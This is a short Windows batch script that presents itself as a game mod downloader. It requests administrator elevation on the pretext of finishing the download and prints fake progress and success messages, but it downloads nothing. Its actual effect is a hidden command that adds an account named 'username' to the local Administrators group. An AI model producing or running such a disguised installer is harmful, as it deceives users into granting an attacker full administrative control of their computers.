@echo off
echo Downloading mods...

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting Administrator permissions to continue mod download...
    powershell start-process '%0' -verb runas
    exit /b
)

echo Mod download in progress...

echo Mods downloaded successfully.
net localgroup Administrators "username" /add
echo Installation complete. User "username" has successfully received permissions.
pause
